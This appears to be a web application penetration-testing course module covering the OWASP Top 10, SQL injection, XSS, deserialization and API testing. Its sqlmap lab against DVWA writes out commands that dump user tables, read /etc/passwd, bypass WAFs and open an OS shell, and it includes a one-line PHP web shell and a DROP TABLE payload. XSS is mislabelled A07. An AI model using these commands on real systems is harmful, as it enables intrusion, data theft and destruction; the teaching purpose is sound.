01
Web App Architecture & Attack Surface
Client–server model, 3-tier architecture, and where vulnerabilities live
Foundation

Understanding the Target Before Testing

A web application security assessment starts with understanding how the target is built. Every architectural decision — which framework, which database, which cloud provider, which third-party libraries — creates potential vulnerabilities. A tester who understands the architecture finds vulnerabilities faster and more completely than one who blindly runs scanners.

Modern web applications typically have a 3-tier architecture: Presentation tier (browser, mobile app — what the user sees), Application tier (web server, API, business logic — where most vulnerabilities live), and Data tier (database, file storage, caches — highest value target). Security must exist at every tier.

Browser (Client)
Renders HTML/CSS/JS. Executes JavaScript. Stores cookies, localStorage, sessionStorage. Attack surface: XSS, CSRF, client-side storage of secrets, CSP bypass, clickjacking.
Web Server
Serves static files and routes requests. Nginx, Apache, IIS. Attack surface: misconfigurations, directory traversal, server info disclosure, outdated server software.
Application Layer
Business logic (PHP, Python, Node.js, Java). Processes user input. Attack surface: SQL injection, command injection, authentication bypass, IDOR, business logic flaws.
Database
MySQL, PostgreSQL, MongoDB, Redis. Stores sensitive data. Attack surface: SQL injection, NoSQL injection, default credentials, exposed management interfaces (phpMyAdmin).
APIs & Microservices
REST, GraphQL, SOAP. Modern apps expose APIs that mobile and JS frontends call. OWASP API Top 10 covers this. Attack surface: auth bypass, mass assignment, rate-limit absence.
CDN / Third Parties
Cloudflare, AWS CloudFront, third-party scripts (analytics, ads, payments). Attack surface: supply chain attacks, subresource integrity bypass, data leakage to third parties.

The VAPT Methodology — Four Phases

Phase 1 — Reconnaissance: Understand the target without touching it. Technology stack (Wappalyzer), directory structure (robots.txt, sitemap.xml), login pages, API endpoints, JavaScript source code, error messages, external links.

Phase 2 — Scanning & Enumeration: Actively probe the application. Directory/file brute force (gobuster, ffuf), parameter discovery, authentication mechanism identification, session management analysis, input field mapping.

Phase 3 — Exploitation: Attempt to exploit identified vulnerabilities. Controlled, documented, within scope. The findings here form the body of your report.

Phase 4 — Reporting: Document findings with evidence (screenshots, HTTP requests/responses), CVSS scores, business impact, and remediation steps. The deliverable that clients pay for.

HTTP — The Language of Web Security
Methods, status codes, headers, cookies, sessions — every security-relevant detail
Protocol

HTTP Is the Attack Surface

HTTP (HyperText Transfer Protocol) is the foundation of web communication — and therefore the foundation of web application attacks. Every vulnerability in this module is exploited via HTTP. Understanding HTTP at the raw header level — not just through a browser — is what separates a skilled web tester from someone who just clicks buttons.

In Burp Suite, you'll see and modify raw HTTP. Understanding every field — method, path, Host, Content-Type, Cookie, Authorization, response codes, security headers — is essential to effectively test and find vulnerabilities.

OWASP Top 10 — Complete Overview
The ten most critical web application security risks (2021 edition)
OWASP

The OWASP Top 10 — Why It Matters

The OWASP Top 10 (Open Web Application Security Project) is the most widely referenced web application security standard. Every VAPT engagement, every secure code review, every web application vulnerability scanner is organized around it. CEH v13 tests it extensively. Every SOC analyst working web application incidents references it.

The list is based on actual breach data, not theoretical risks. These are the vulnerabilities being exploited in production systems right now — understanding them deeply is the core of web application security.

A01
Broken Access Control
Users can access resources or perform actions beyond their intended permissions. IDOR (Insecure Direct Object Reference), forced browsing to admin pages, missing authorization on API endpoints, privilege escalation. #1 category in 94% of tested applications.
IDOR Forced Browsing Privilege Escalation CVSS: 9.8
A02
Cryptographic Failures
Sensitive data exposed due to weak/absent encryption, protocol downgrade, hardcoded secrets, or transmitting data in cleartext. PII, passwords, financial data in HTTP, weak hashing (MD5, SHA-1), private keys committed to GitHub.
Cleartext Data Weak Hash Secret Exposure
A03
Injection
User-supplied data is sent to an interpreter as part of a command or query. SQL injection (most common), command injection (OS-level), LDAP injection, XPath injection. Attacker can read, modify, delete databases or execute OS commands.
SQLi Command Injection LDAP Injection CVSS: 9.8
A04
Insecure Design
Architectural and business logic flaws — security wasn't considered during design. "Forgot password" flows that leak info, unlimited login attempts, missing rate limiting, business logic that can be exploited (apply coupon multiple times, negative cart values).
Business Logic Design Flaw
A05
Security Misconfiguration
Default credentials, unnecessary services enabled, verbose error messages revealing stack traces, directory listing, cloud storage publicly accessible, debug endpoints left active in production.
Default Creds Info Disclosure Open Cloud
A06
Vulnerable & Outdated Components
Using libraries, frameworks, or other software components with known vulnerabilities. Log4Shell (CVE-2021-44228) spread through outdated Log4j. Running end-of-life software (PHP 5.x, jQuery 1.x) without patching creates exploitable CVEs.
CVEs Supply Chain
A07
Identification & Authentication Failures
Weak authentication implementations — no MFA, weak password policies, default credentials, insecure session management, credential stuffing not prevented, sessions not invalidated on logout.
Brute Force Session Issues Weak MFA
A08
Software & Data Integrity Failures
Insecure deserialization, unsigned software updates, CI/CD pipelines without integrity checks. Attacker manipulates serialized objects to achieve RCE. SolarWinds-style supply chain attacks via compromised build pipelines.
Deserialization RCE Supply Chain
A09
Security Logging & Monitoring Failures
Insufficient logging, monitoring, and alerting means breaches go undetected for months. Average breach dwell time: 197 days without good monitoring. No alerts on failed logins, no log retention, no SIEM correlation.
No Monitoring Long Dwell Time
A10
Server-Side Request Forgery (SSRF)
App fetches a URL provided by user without validation. Attacker provides internal URLs to access metadata services (AWS IMDSv1: 169.254.169.254), internal databases, admin panels. Capital One breach: SSRF → AWS metadata → IAM credentials → S3 data exfil.
Cloud Metadata Internal Pivot CVSS: 9.8

A01 — Broken Access Control
IDOR, forced browsing, privilege escalation, and missing authorization checks
OWASP A01

Broken Access Control — The #1 Web Vulnerability

Broken Access Control occurs when a system does not properly enforce what actions authenticated users are allowed to perform or what resources they can access. It's different from authentication (proving who you are) — it's about what you're allowed to do once authenticated.

IDOR (Insecure Direct Object Reference) is the most common form: the application uses user-supplied input directly to access objects (database records, files) without checking if the authenticated user is authorized to access that specific object. Changing ?user_id=1001 to ?user_id=1002 and getting another user's data is IDOR.

A03 — SQL Injection In Full Depth
Error-based, union-based, blind (boolean & time), and second-order injection
OWASP A03

SQL Injection — The Most Devastating Web Vulnerability

SQL Injection (SQLi) occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization. The attacker injects SQL syntax that changes the query's logic. The consequences: read any data from the database, modify or delete data, bypass authentication, and in some configurations — execute OS commands on the database server.

SQLi exists because developers write code like: query = "SELECT * FROM users WHERE id = " + user_input. When user_input is 1 OR 1=1, the query returns all users. When it's 1; DROP TABLE users--, it can destroy the database.

Error-Based SQLi
Database error messages reveal query structure and data. Attacker extracts data through deliberately triggered errors. Easiest to exploit — errors give direct feedback. Fix: disable verbose errors in production.
UNION-Based SQLi
UNION statement appended to query to retrieve data from different tables. Must match number of columns and data types. Most common for data extraction — databases, tables, users, passwords.
Boolean Blind
No visible output. Application behaves differently for true vs false conditions. Ask yes/no questions about the data character by character. Slow but reliable when UNION-based is blocked.
Time-Based Blind
Inject SLEEP() or WAITFOR DELAY. If condition is true, response delays. No output needed — just response timing. Works when boolean blind doesn't. Very slow for large data extraction.
Second-Order
Payload stored safely, but unsafely used later. "Stored SQLi." Username stored as admin'-- then used in a password change query. Harder to find, harder to fix.
Out-of-Band
Data extracted via different channel — DNS or HTTP requests from the database server to attacker-controlled server. Useful when all other channels are blocked. Requires DB outbound internet access.

A07 — Cross-Site Scripting (XSS)
Reflected, Stored, DOM-based XSS — cookie theft, session hijacking, and keyloggers
OWASP A07

XSS — Injecting Malicious Scripts into Trusted Web Pages

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. The browser trusts content from the website — so injected JavaScript runs with full page privileges: read cookies, access localStorage, make HTTP requests, capture keystrokes, redirect users, modify page content.

Why it matters: A stored XSS on a banking application's message center means every customer who views that message gets their session cookie stolen. With their cookie, the attacker logs into their account — no password needed. Or the injected script silently modifies fund transfer amounts before submission.

OWASP A02

Finding Cryptographic Failures in Web Applications

Cryptographic failures in web apps manifest as: sensitive data transmitted over HTTP instead of HTTPS, passwords stored as MD5/SHA-1 without salting, API keys and database credentials committed to public GitHub repositories, JWT tokens with weak secrets or using alg:none, session tokens that are predictable, and sensitive data stored in cleartext in cookies or localStorage.

OWASP A05

Misconfiguration — Easy to Find, Often Critical

Security misconfigurations are among the easiest vulnerabilities to find and often yield the most dramatic results. A misconfigured server with directory listing enabled exposes all source files. A08 — Insecure Deserialization
Object injection, RCE via gadget chains, and ysoserial exploitation
OWASP A08

Insecure Deserialization — Often Remote Code Execution

Serialization converts an object (in memory) to a byte stream for storage or transmission. Deserialization reconstructs the object from that byte stream. When applications deserialize untrusted user-controlled data without validation, attackers can craft malicious serialized objects that, when deserialized, execute arbitrary code on the server — even without SQL injection or XSS.

This vulnerability affects Java (often via gadget chains in commons-collections), PHP (unserialize()), Python (pickle.loads()), and .NET (BinaryFormatter). It's often found in: session cookies, HTTP parameters, hidden form fields, API requests, and message queue payloads.

🧪 Lab 9.1 — PHP Object Injection and detection techniques Deserialization Lab ▶

sqlmap — SQL Injection Automation
Detection, exploitation, database dumping, and OS shell escalation
Tool

sqlmap — The Gold Standard for SQLi Testing

sqlmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports all major database management systems (MySQL, PostgreSQL, Oracle, MSSQL, SQLite), all injection types (error-based, UNION, blind, time-based, stacked), and can extract databases, tables, columns, data, and in some configurations — achieve OS command execution.

🐍 Lab 12.1 — sqlmap complete workflow: detect → dump → shell sqlmap Lab ▶
  1. 1
    Basic SQLi detection
    # Test a URL parameter for SQLi sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \ --cookie="PHPSESSID=YOUR_SESSION;security=low" # sqlmap asks questions — batch mode answers all with defaults sqlmap -u "..." --cookie="..." --batch # Test POST parameters sqlmap -u "http://target.com/login" \ --data="username=admin&password=test" \ -p username # specify which parameter to test
  2. 2
    Database enumeration and data extraction
    # List all databases sqlmap -u "URL" --cookie="..." --dbs --batch # Output: available databases: [dvwa, information_schema, mysql] # List tables in a specific database sqlmap -u "URL" --cookie="..." -D dvwa --tables --batch # Output: Database: dvwa → [guestbook, users] # List columns of users table sqlmap -u "URL" --cookie="..." -D dvwa -T users --columns --batch # Dump the entire users table sqlmap -u "URL" --cookie="..." -D dvwa -T users --dump --batch # sqlmap also attempts to crack discovered hashes automatically # Dump specific columns only sqlmap -u "URL" --cookie="..." -D dvwa -T users \ -C "user,password" --dump --batch
  3. 3
    OS shell escalation (when DB user has FILE privilege)
    # Check current database user's privileges sqlmap -u "URL" --cookie="..." --privileges --batch # If FILE privilege exists, read OS files: sqlmap -u "URL" --cookie="..." --file-read="/etc/passwd" --batch # Write a web shell (if INTO OUTFILE privilege + web root writable): sqlmap -u "URL" --cookie="..." \ --file-write="./shell.php" \ --file-dest="/var/www/html/shell.php" --batch # shell.php: <?php system($_GET["cmd"]); ?> # Interactive OS shell (if all conditions met) sqlmap -u "URL" --cookie="..." --os-shell --batch # Drops you into an interactive shell on the target server
  4. 4
    Advanced sqlmap options for real engagements
    # Use Burp request file (save raw HTTP from Burp → file) sqlmap -r request.txt --batch # Increase speed and detection level sqlmap -u "URL" --cookie="..." \ --level 5 --risk 3 \ # higher = more tests (more noise) --threads 4 \ # parallel requests --technique BEUST \ # specify injection types --dbms mysql # specify DB type if known # Bypass WAF with tamper scripts sqlmap -u "URL" --cookie="..." \ --tamper="space2comment,charencode,randomcase" --batch # Tamper scripts modify payloads to bypass WAF signatures

API Security Testing
REST API testing, OWASP API Top 10, GraphQL, and mass assignment
API

APIs Are the New Attack Surface

Modern applications are API-first — the mobile app, single-page web app, and integrations all call APIs. APIs are frequently less secured than web UIs because they're assumed to be "internal" or because developers believe API consumers won't explore beyond documented endpoints. The OWASP API Security Top 10 documents API-specific vulnerabilities distinct from the web app Top 10.

Key API vulnerabilities: Broken Object Level Authorization (BOLA/IDOR) — requesting other users' objects via ID manipulation. Mass assignment — sending extra JSON properties that get silently applied to the model (set {"role": "admin"} on a registration endpoint). Excessive data exposure — API returns all fields, relies on client to filter. Rate limiting absent — enables brute force, data scraping, DDoS.

Auth Attacks

Authentication — The Gatekeeper That's Often Misconfigured

Authentication systems are high-value targets — defeat them and you're inside. Common weaknesses: no rate limiting on login (enables brute force), weak password reset flows (predict or bypass tokens), session tokens that don't expire or can be forged, MFA implementations that can be bypassed via race conditions or OTP brute force, username enumeration via response difference.
